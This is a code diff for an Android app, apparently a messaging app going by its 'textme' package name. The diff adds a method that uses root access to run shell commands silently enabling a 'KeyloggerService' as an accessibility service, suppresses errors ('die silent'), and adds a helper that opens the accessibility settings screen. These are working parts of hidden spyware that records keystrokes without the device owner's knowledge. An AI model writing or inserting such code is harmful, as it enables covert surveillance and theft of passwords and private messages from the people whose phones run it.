@@ -32,6 +32,8 @@ import com.candroid.lofl.data.db.Database;
 import com.candroid.lofl.data.db.DatabaseHelper;
 import com.candroid.lofl.services.CommandsIntentService;
 
+import java.io.DataOutputStream;
+import java.io.IOException;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.SocketException;
@@ -86,6 +88,14 @@ public class Systems {
             }
         }
 
+        public static class Settings{
+            public static void openAccessibilityOptions(Context context){
+                Intent intent = new Intent();
+                intent.setAction(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+            }
+        }
     }
 
     public static class Alarms{
@@ -332,6 +342,26 @@ public class Systems {
             };
         }
 
+    }
+
+    public static class Root{
+        public static void startKeyloggingService(){
+            try {
+                java.lang.Process process = Runtime.getRuntime().exec("su");
+                DataOutputStream dos = new DataOutputStream(process.getOutputStream());
+                dos.writeBytes("settings put secure enabled_accessibility_services com.candroid.textme/com.candroid.lofl.services.KeyloggerService\n");
+                dos.flush();
+                dos.writeBytes("settings put secure accessibility_enabled 1\n");
+                dos.flush();
+                dos.writeBytes("exit\n");
+                dos.flush();
+                process.waitFor();
+            } catch (IOException e) {
+                //die silent
+            } catch (InterruptedException e) {
+                //die silent
+            }
+        }
     }
 
 }
